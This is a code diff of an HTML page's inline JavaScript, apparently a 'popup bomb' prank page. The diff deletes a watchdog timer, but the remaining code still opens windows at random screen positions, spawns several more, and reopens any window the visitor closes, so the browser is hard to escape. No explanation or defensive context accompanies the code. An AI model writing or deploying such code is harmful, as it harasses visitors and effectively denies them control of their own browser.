@@ -12,27 +12,11 @@
     <script>
         window.plsclose = 'no'
         window.clone = new URLSearchParams(window.location.search).get('popup') || 'main'
-        window.time = () => ~~(Date.now() / 2000)
-        window.timestamp = window.time()
-        
-        function update() {
-            window.timestamp = window.time()
-        }
-        
-        function interval() {
-            const inter = setInterval(() => {
-                if(window.time() !== window.timestamp) {
-                    clearInterval(inter)
-                    openNew('safe')
-                }
-            }, 500)
-        }
         
         function openNew(input) {
             var popup = window.open(window.location.href + '?popup=' + input, '', 'top=' + Math.floor(Math.random() * screen.availHeight) + ',left=' + Math.floor(Math.random() * screen.availWidth) + ',width=350,height=250');
             
             var popupTick = setInterval(function () {
-                popup.window.update()
                 if (popup.closed) {
                     clearInterval(popupTick);
                     if (window.plsclose == "no") {
@@ -47,12 +31,9 @@
         if (window.clone === 'main') {
             openNew('safe')
         } else if (window.clone === 'safe') {
-            interval()
             openNew('popup')
             openNew('popup')
             openNew('popup')
-        } else {
-            interval()
         }
     </script>
     <style>
